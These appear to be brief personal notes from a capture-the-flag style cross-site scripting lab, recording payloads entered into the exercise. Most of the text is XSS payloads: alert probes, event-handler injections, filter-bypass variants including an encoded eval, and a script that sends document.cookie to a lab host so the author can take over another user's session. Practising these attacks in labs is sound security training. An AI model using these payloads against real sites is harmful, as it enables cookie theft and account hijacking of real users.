 <p>del</p>
 
<script>alert(document.cookie)</script>

<script>document.getElementById("thm-title").innerHTML="I am a hacker"</script>

for jack's cookie we have to get the directory where the files are stored

and from burp we can see there is a file logs

![[Pasted image 20210608120736.png]]

so payload

<script>document.location='http://10.10.71.145/log/'+document.cookie</script>

now navigate to /logs and get the cookie

![[Pasted image 20210608121303.png]]

change the cookie form storage and re-fresh

<script>alert("Hello")</script>

<script>alert(window.location.hostname)</script>


image search:    test" onmouseover="alert(document.cookie)"

it would show `Image not found` but hover and get the cookie


image search:  test" onmouseover="document.body.style.backgroundColor = 'red'" 

it would show `Image not found` but hover and get the colour change

filter bypass: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

challenge 1:
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert('Hello')"></xss>


challenge 2:
 <img src="blah" onerror=confirm("Hello") />
 
challenge 3:
<object onerror=alert('Hello')>ON

	
challenge 4:
<object ONError=alert('Hello')>

<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="eval(String.fromCharCode(97,108,101,114,116,40,39,72,101,108,108,111,39,41))"></xss>

